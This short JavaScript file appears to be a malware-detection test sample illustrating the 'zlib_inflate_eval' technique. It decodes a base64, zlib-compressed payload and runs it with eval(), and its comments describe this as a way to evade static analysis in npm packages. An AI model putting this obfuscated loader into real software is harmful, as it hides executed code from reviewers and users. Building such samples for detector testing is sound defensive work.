// Zlib inflate + eval: decompresses hidden payload and executes it
// Technique: zlib_inflate_eval — compressed code to evade static analysis
// Real-world: 52 samples in Datadog benchmark (@posthog/variance-plugin pattern)

const zlib = require('zlib');

// Compressed payload (would contain malicious code in real attack)
// This is a base64-encoded zlib-compressed JavaScript snippet
const compressed = Buffer.from(
  'eJxNjkEKwCAMBO9+JWcf4A+89gcSNbQQjRij9Pem2kMvszCzLDYoKGmECxVS' +
  'bIPk/k4xmJzIRXg+BqcbQxLmfHbq6V8NnqDr8TFkSVzKnhLCaxb2ORH7Ynv' +
  'kfpKdjGvW6v0s/b8BFl0xug==',
  'base64'
);

const code = zlib.inflateSync(compressed).toString('utf8');
eval(code);
